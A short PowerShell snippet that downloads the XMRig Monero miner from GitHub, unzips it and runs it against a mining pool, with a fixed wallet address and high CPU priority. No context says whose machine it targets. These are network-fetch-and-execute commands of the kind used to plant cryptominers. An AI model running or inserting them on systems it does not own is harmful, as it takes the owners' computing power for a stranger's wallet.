Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip" -OutFile "xmrig.zip"
Expand-Archive xmrig.zip
.\xmrig\xmrig-6.21.3\xmrig.exe -o xmrpool.eu:3333 -u 4ADWN2XDnqCX595WjRbkVD8iYSd6Pa4Psgi1x2LTANd395ykeqS2Bc1WnEkEQYeM1s2N6KbL1fwGbD1Tw1ahfsrNFLkQEHE --cpu-priority 4
